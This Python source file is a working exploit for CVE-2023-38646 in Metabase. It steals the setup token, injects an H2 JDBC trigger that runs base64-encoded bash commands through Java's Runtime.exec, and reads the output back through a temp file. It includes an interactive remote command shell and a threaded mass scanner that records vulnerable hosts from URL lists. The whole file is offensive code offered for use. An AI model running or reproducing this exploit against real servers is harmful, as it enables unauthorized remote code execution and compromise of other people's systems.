import re
import os
import json
import base64
import argparse
import warnings
import requests

from rich.console import Console
from urllib.parse import urlparse
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

console = Console()
warnings.simplefilter('ignore', InsecureRequestWarning)


def get_token_from_api(base_url):
    url = base_url + "/api/session/properties"
    response = requests.get(url, verify=False, timeout=3)
    data = json.loads(response.text)
    token = data.get('setup-token')
    return token

def send_request(base_url, token, command='uname -a'):
    command = f"(echo '[S]';{command};echo '[E]') > /tmp/lol"
    encoded_command = base64.b64encode(f"$( {command} )".encode()).decode().replace('=', '%3D')
    payload = {
        "token": token,
        "details": {
            "details": {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo," + encoded_command + "}|{base64,-d}|{bash,-i}')\n$$--=x",
                "advanced-options": False
            },
            "engine": "h2"
        }
    }
    parsed_url = urlparse(base_url)
    headers = {
        'Host': parsed_url.netloc,
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 ',
        'Connection': 'close',
    }
    response = requests.post(f"{base_url}/api/setup/validate", headers=headers, data=json.dumps(payload))

    json_data = {
        'token': token,
        'details': {
            'details': {
                'subprotocol': 'h2',
                'classname': 'org.h2.Driver',
                'advanced-options': True,
                'subname': "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '/tmp/lol'//\\;",
            },
            'name': '1337_h4x0r',
            'engine': 'postgres',
        },
    }

    url = f"{base_url}/api/setup/validate"
    response = requests.post(url, headers=headers, json=json_data, verify=False, timeout=3)
    return response

def check_vulnerability(url, response, verbose, output_file=None, single_url_mode=False):
    match = re.search(r'\[S\](.*?)\[E\]', response.text)
    if match:
        pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
        response_content = pattern.search(response.text)
        console.print(f"[bold red]{url} is vulnerable.[/bold red]") if not single_url_mode else None
        if output_file and not single_url_mode:
            with open(output_file, 'a') as file:
                file.write(url + '\n')
        if verbose or single_url_mode:
            truncated_content = response_content.group(1).replace('\\000a', '\n').replace('\\n', '\n')
            console.print(f"[bold green]Response content: [yellow]{truncated_content}[/yellow][/bold green]")
        return True    

def check_url(url, verbose, output_file, single_url_mode=False):
    token = get_token_from_api(url)
    response = send_request(url, token)
    if check_vulnerability(url, response, verbose, output_file):
        if single_url_mode:
            session = PromptSession(history=InMemoryHistory())
            while True:
                try:
                    command = session.prompt(HTML('<ansired><b># </b></ansired>'))
                    if "exit" in command:
                        raise KeyboardInterrupt
                    elif not command:
                        continue
                    elif "clear" in command:
                        if os.name == 'posix':
                            os.system('clear')
                        elif os.name == 'nt':
                            os.system('cls')              
                        if command.lower() in ["exit", "quit"]:
                            break                                
                    response = send_request(url, token, command)
                    check_vulnerability(url, response, verbose, output_file, single_url_mode=True)
                except KeyboardInterrupt:
                    console.print("[bold yellow][!] Exiting shell...[/bold yellow]")    
                    return None

def main():
    parser = argparse.ArgumentParser(description='CVE-2023-38646 Exploit')
    parser.add_argument('-u', '--url', type=str, help='The base url for the requests', required=False)
    parser.add_argument('-v', '--verbose', action='store_true', help='Print verbose output')
    parser.add_argument('-l', '--list', type=str, help='File containing a list of base urls to scan', required=False)
    parser.add_argument('-t', '--threads', type=int, help='Number of threads to use', default=100)
    parser.add_argument('-o', '--output', type=str, help='File to output vulnerable urls')

    args = parser.parse_args()

    if args.list:
        with open(args.list, 'r') as file:
            urls = [line.strip() for line in file]
            with ThreadPoolExecutor(max_workers=args.threads) as executor, alive_bar(len(urls), bar='smooth') as bar:
                futures = {executor.submit(check_url, url, args.verbose, args.output): url for url in urls}
                for future in as_completed(futures):
                    bar()
    elif args.url:
        check_url(args.url, args.verbose, args.output, single_url_mode=True)
    else:
        console.print("[red]Please provide a url or a file with a list of base urls to scan.[/red]")

if __name__ == "__main__":
    main()
